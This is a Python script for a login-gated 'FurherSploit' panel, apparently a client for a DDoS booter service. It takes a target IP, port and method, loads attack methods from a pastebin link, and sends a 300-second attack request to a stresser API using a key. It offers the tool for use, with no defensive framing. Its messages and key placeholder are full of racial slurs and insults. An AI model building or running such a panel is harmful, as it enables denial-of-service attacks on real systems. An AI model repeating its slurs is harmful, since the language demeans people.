import requests
import time
import sys
import os

username = "MrHive17"
password = "HIVENET7"

max_time = "300s | 5min"

methods_from_api = str("https://pastebin.com/raw/5iBn9TAQ")
api = str("https://example.com/")
key = str("niggayourkeygoeshere")

goodbye_banner = str("\nCreated By Furher Acker\n Hope You Enjoyed")

os.system("clear")

banner = "\r╔═╗╦ ╦╦═╗╦ ╦╔═╗╦═╗╔═╗╔═╗╦  ╔═╗╦╔╦╗\n╠╣ ║ ║╠╦╝╠═╣║╣ ╠╦╝╚═╗╠═╝║  ║ ║║ ║\n╚  ╚═╝╩╚═╩ ╩╚═╝╩╚═╚═╝╩  ╩═╝╚═╝╩ ╩"

def really_nigga():
    while True:
        try:
            print("really nigga again with the bullshit...")
            time.sleep(9)
            menu()
        except KeyboardInterrupt:
             time_out()

def time_out():
    while True:
        try:
            print("okay nigga timeout for you now lol...goodluck")
            time.sleep(9)
            os.system("clear")
            print("your timeout is over dumbass")
            menu()
        except KeyboardInterrupt:
             really_nigga()

def attack_menu():
       ip = str(input("IP: "))
       port = str(input("PORT: "))
       print(f"MAX PRESET ATTACK TIME {max_time}")
       attk_time = "300"
       print("LOADING METHODS")
       x = requests.get(methods_from_api)
       print(x.text)
       method = input("METHOD: ")
       h = requests.get(api+"?key="+key+"&&ip="+ip+"&&port="+port+"&&time="+attk_time+"&&method="+method)
       print(f"{h}")
       print(f"ATTACK SENT TO: {ip} ON PORT {port} FOR {attk_time} WITH METHOD {method}")
       print("TIME FOR COOLDOWN BRO SHEESH\(o_o')/")
       time.sleep(2)
       os.system("clear")
       print(banner)
       print(f"COOL DOWN TIME LEFT: 10s")
       print("FURHERSPLOIT PANEL WILL RESUME AFTER COOL DOWN TIME")
       try:
           for _ in range(1):
               while True:
                   time.sleep(7)
       except KeyboardInterrupt:
           print("NOTTY ACTIONS DETECTED YOUR GETTING PUT IN TIME OUT FOR 10s AGAIN YOU FUCKING BOZO")
           for _ in range(1):
               try:
                   time.sleep(9)
               except KeyboardInterrupt:
                   time_out()
def menu():
      try:
          os.system("clear")
          print(banner)
          while True:
             hiveInput = input(f"root@{username}: ")
             if hiveInput == None:
                 print("Invalid Command Try ? or help")
             elif hiveInput == "help":
                 print("methods | shows api methods\nattack | starts attack input")
             elif hiveInput == "attack":
                 attack_menu()
             elif hiveInput == "?":
                 print("methods | shows api methods\nattack | starts attack input")
             elif hiveInput == "clear":
                 os.system("clear")
                 print(banner)
             elif hiveInput == "methods":
                 t = requests.get(methods_from_api)
                 print(t.text)
                 time.sleep(1)
             elif hiveInput == "logout":
                 print(goodbye_banner)
                 time.sleep(2)
                 os.system("clear")
                 sys.exit()
             else:
                 os.system("clear")
                 print(banner)
      except KeyboardInterrupt:
             os.system("clear")
             print(banner+"\n\nto exit type logout")
             time.sleep(1)
             menu()

def login():
    user_input = str(input("USERNAME: "))
    pass_input = str(input("PASSWORD: "))

    if user_input == username and pass_input == password:
       print("Logged in")
       menu()
    else:
       print("Lol, no")
       sys.exit()

def main():
    login()
main()
